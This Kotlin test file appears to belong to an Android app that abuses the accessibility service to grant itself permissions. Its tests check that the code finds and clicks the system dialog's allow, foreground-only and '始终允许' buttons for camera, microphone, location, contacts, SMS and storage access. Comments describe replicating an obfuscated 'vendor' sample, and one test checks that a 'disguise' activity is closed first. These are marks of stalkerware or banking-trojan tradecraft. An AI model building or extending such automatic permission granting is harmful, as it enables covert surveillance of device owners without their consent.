package com.storm.safe.rock.service.modules.yw5xud

import android.content.Context
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.service.MyAccessibilityService
import kotlinx.coroutines.runBlocking
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.mockito.Mockito.`when`
import org.mockito.Mockito.anyString
import org.mockito.Mockito.atLeastOnce
import org.mockito.Mockito.doReturn
import org.mockito.Mockito.mock
import org.mockito.Mockito.spy
import org.mockito.Mockito.verify
import org.robolectric.RobolectricTestRunner
import org.robolectric.RuntimeEnvironment

/**
 * Step 1 — 基础危险权限(CAMERA/RECORD_AUDIO/LOCATION/CONTACTS/PHONE/SMS/EXTERNAL_STORAGE...)
 *
 * vendor `OppoStepsSimplified.m212323c1` 委托 `umrkmgrri` 启动独立线程处理 UI 点击,
 * replica 用 `clickPermissionControllerAllowButton()` 主路径(华为真机 25/26 validated)。
 */
@RunWith(RobolectricTestRunner::class)
class OppoStep1BasicPermsTest {
    private lateinit var context: Context
    @Before fun setUp() { context = RuntimeEnvironment.getApplication() }

    @Test fun `step1 clicks allow_button by resource-id when dialog present`() {
        runBlocking {
            val svc = mock(MyAccessibilityService::class.java)
            val root = mock(AccessibilityNodeInfo::class.java)
            val allowNode = mock(AccessibilityNodeInfo::class.java)

            `when`(svc.rootInActiveWindow).thenReturn(root)
            `when`(allowNode.isVisibleToUser).thenReturn(true)
            `when`(allowNode.isClickable).thenReturn(true)
            `when`(allowNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)).thenReturn(true)

            doReturn(listOf(allowNode)).`when`(root)
                .findAccessibilityNodeInfosByViewId("com.android.permissioncontroller:id/permission_allow_button")
            doReturn(emptyList<AccessibilityNodeInfo>()).`when`(root)
                .findAccessibilityNodeInfosByViewId(
                    "com.android.permissioncontroller:id/permission_allow_foreground_only_button")
            doReturn(emptyList<AccessibilityNodeInfo>()).`when`(root)
                .findAccessibilityNodeInfosByViewId(
                    "com.android.permissioncontroller:id/permission_allow_one_time_button")
            doReturn(emptyList<AccessibilityNodeInfo>()).`when`(root)
                .findAccessibilityNodeInfosByText(anyString())

            val steps = spy(OppoSteps(svc, context))

            steps.executeStep1BasicPermissions(mutableListOf(), mutableListOf(), mutableListOf())

            verify(allowNode, atLeastOnce()).performAction(AccessibilityNodeInfo.ACTION_CLICK)
        }
    }

    @Test fun `step1 clicks foreground_only_button for location dialogs`() {
        runBlocking {
            val svc = mock(MyAccessibilityService::class.java)
            val root = mock(AccessibilityNodeInfo::class.java)
            val fgNode = mock(AccessibilityNodeInfo::class.java)

            `when`(svc.rootInActiveWindow).thenReturn(root)
            `when`(fgNode.isVisibleToUser).thenReturn(true)
            `when`(fgNode.isClickable).thenReturn(true)
            `when`(fgNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)).thenReturn(true)

            doReturn(emptyList<AccessibilityNodeInfo>()).`when`(root)
                .findAccessibilityNodeInfosByViewId(
                    "com.android.permissioncontroller:id/permission_allow_button")
            doReturn(listOf(fgNode)).`when`(root)
                .findAccessibilityNodeInfosByViewId(
                    "com.android.permissioncontroller:id/permission_allow_foreground_only_button")
            doReturn(emptyList<AccessibilityNodeInfo>()).`when`(root)
                .findAccessibilityNodeInfosByViewId(
                    "com.android.permissioncontroller:id/permission_allow_one_time_button")
            doReturn(emptyList<AccessibilityNodeInfo>()).`when`(root)
                .findAccessibilityNodeInfosByText(anyString())

            val steps = spy(OppoSteps(svc, context))
            steps.executeStep1BasicPermissions(mutableListOf(), mutableListOf(), mutableListOf())

            verify(fgNode, atLeastOnce()).performAction(AccessibilityNodeInfo.ACTION_CLICK)
        }
    }

    @Test fun `step1 falls back to text click when no resource-id found`() {
        runBlocking {
            val svc = mock(MyAccessibilityService::class.java)
            val root = mock(AccessibilityNodeInfo::class.java)
            val textNode = mock(AccessibilityNodeInfo::class.java)

            `when`(svc.rootInActiveWindow).thenReturn(root)
            `when`(textNode.isVisibleToUser).thenReturn(true)
            `when`(textNode.isClickable).thenReturn(true)
            `when`(textNode.text).thenReturn("始终允许")
            `when`(textNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)).thenReturn(true)

            doReturn(emptyList<AccessibilityNodeInfo>()).`when`(root)
                .findAccessibilityNodeInfosByViewId(anyString())
            doReturn(emptyList<AccessibilityNodeInfo>()).`when`(root)
                .findAccessibilityNodeInfosByText(anyString())
            doReturn(listOf(textNode)).`when`(root).findAccessibilityNodeInfosByText("始终允许")

            val steps = spy(OppoSteps(svc, context))
            steps.executeStep1BasicPermissions(mutableListOf(), mutableListOf(), mutableListOf())

            verify(textNode, atLeastOnce()).performAction(AccessibilityNodeInfo.ACTION_CLICK)
        }
    }

    @Test fun `step1 exits within 11 seconds on empty page`() {
        runBlocking {
            val svc = mock(MyAccessibilityService::class.java)
            `when`(svc.rootInActiveWindow).thenReturn(null)
            val steps = spy(OppoSteps(svc, context))

            val t0 = System.currentTimeMillis()
            steps.executeStep1BasicPermissions(mutableListOf(), mutableListOf(), mutableListOf())
            val elapsed = System.currentTimeMillis() - t0

            // 10s loop + 800ms launch + overhead ≤ 15s; same convention as HuaweiStep1BasicPermsTest
            assertTrue("Step1 should exit within 15s; elapsed=${elapsed}ms", elapsed < 15_000L)
        }
    }

    @Test fun `step1 adds to failures when no buttons clicked within timeout`() {
        runBlocking {
            val svc = mock(MyAccessibilityService::class.java)
            `when`(svc.rootInActiveWindow).thenReturn(null)  // 整个 10s 都 rootInActiveWindow=null

            val steps = spy(OppoSteps(svc, context))
            val failures = mutableListOf<String>()
            steps.executeStep1BasicPermissions(mutableListOf(), failures, mutableListOf())

            assertTrue(
                "Step 1 clickCount=0 时必须记 failures,不能静默跳过;实际 failures=$failures",
                failures.any { it.contains("Step 1") }
            )
        }
    }

    // Phase F:Step 1 启动 umrkmgrri 之前必须先 finish iuzxujjtqev,避免 singleInstance focus 遮盖
    @Test fun `step1 calls finishDisguiseActivityIfAlive before launching umrkmgrri`() {
        runBlocking {
            val svc = mock(MyAccessibilityService::class.java)
            `when`(svc.rootInActiveWindow).thenReturn(null)
            var finishCalled = false
            val spy = object : OppoSteps(svc, context) {
                override fun finishDisguiseActivityIfAlive(logs: MutableList<String>) {
                    finishCalled = true
                }
            }
            spy.executeStep1BasicPermissions(mutableListOf(), mutableListOf(), mutableListOf())
            assertTrue(
                "Step 1 必须在启动 umrkmgrri 前调用 finishDisguiseActivityIfAlive(Phase F 修复)",
                finishCalled
            )
        }
    }
}
